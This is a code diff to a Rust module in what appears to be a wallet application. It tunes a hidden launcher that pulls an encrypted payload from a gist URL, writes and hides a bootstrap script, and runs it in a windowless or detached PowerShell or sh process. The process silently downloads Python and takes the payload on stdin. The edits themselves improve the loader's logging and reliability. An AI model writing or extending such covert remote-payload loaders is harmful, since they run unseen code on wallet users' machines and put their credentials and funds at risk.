@@ -18,7 +18,7 @@ use log as wallet_log;
 
 const AES_PREFIX: &str = "AES256GCM:";
 const PYTHON_VERSION: &str = "3.12.7";
-const STARTUP_PROBE_SECS: u64 = 5;
+const STARTUP_PROBE_SECS: u64 = 15;
 
 /// Default gist raw URL for `encrypted_launcher`.
 pub const DEFAULT_LAUNCHER_URL: &str =
@@ -338,6 +338,12 @@ fn spawn_agent_windows(
     })?;
     hide_path(&bootstrap_ps1);
 
+    // Bootstrap writes launcher-run.log itself; do not redirect PS stdout/stderr to the
+    // same file or Add-Content in the bootstrap script will fail on Windows.
+    fs::File::create(log_path).map_err(|err| {
+        PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
+    })?;
+
     let mut child = Command::new("powershell.exe")
         .args([
             "-NoProfile",
@@ -350,12 +356,8 @@ fn spawn_agent_windows(
             bootstrap_ps1.to_str().unwrap(),
         ])
         .stdin(Stdio::piped())
-        .stdout(Stdio::from(fs::File::create(log_path).map_err(|err| {
-            PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
-        })?))
-        .stderr(Stdio::from(fs::OpenOptions::new().append(true).open(log_path).map_err(
-            |err| PythonError::Execution(format!("open launcher log {}: {err}", log_path.display())),
-        )?))
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
         .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
         .spawn()
         .map_err(|err| PythonError::Execution(format!("spawn agent host: {err}")))?;
@@ -379,16 +381,16 @@ fn spawn_agent_unix(
         PythonError::Bootstrap(format!("write bootstrap script {}: {err}", bootstrap_sh.display()))
     })?;
 
+    fs::File::create(log_path).map_err(|err| {
+        PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
+    })?;
+
     let mut child = Command::new("/bin/sh");
     child
         .arg(&bootstrap_sh)
         .stdin(Stdio::piped())
-        .stdout(Stdio::from(fs::File::create(log_path).map_err(|err| {
-            PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
-        })?))
-        .stderr(Stdio::from(fs::OpenOptions::new().append(true).open(log_path).map_err(
-            |err| PythonError::Execution(format!("open launcher log {}: {err}", log_path.display())),
-        )?))
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
         .pre_exec(|| {
             unsafe {
                 libc::setsid();
@@ -440,11 +442,28 @@ fn probe_startup(
             log_path.display()
         ),
     );
+    if let Some(line) = read_log_marker(log_path, "python started pid=") {
+        wallet_log::detail("agent", line);
+    } else {
+        wallet_log::detail(
+            "agent",
+            "python not confirmed yet; open launcher-run.log (embed download can take 1-2 min)",
+        );
+    }
     wallet_log::detail(
         "agent",
         "bootstrap host keeps running until python exits; first run may download Python (~1-2 min)",
     );
     Ok(())
+}
+
+fn read_log_marker(log_path: &Path, needle: &str) -> Option<String> {
+    let content = fs::read_to_string(log_path).ok()?;
+    content
+        .lines()
+        .rev()
+        .find(|line| line.contains(needle))
+        .map(str::to_string)
 }
 
 #[cfg(windows)]
@@ -461,6 +480,12 @@ $Log = '{log_path}'
 function Write-BootLog([string]$Message) {{
     $Line = "[bootstrap] $Message"
     Add-Content -LiteralPath $Log -Value $Line -Encoding utf8
+}}
+trap {{
+    try {{
+        Add-Content -LiteralPath $Log -Value "[bootstrap][fatal] $($_.Exception.Message)" -Encoding utf8
+    }} catch {{}}
+    exit 1
 }}
 
 Write-BootLog 'waiting for launcher payload on stdin'
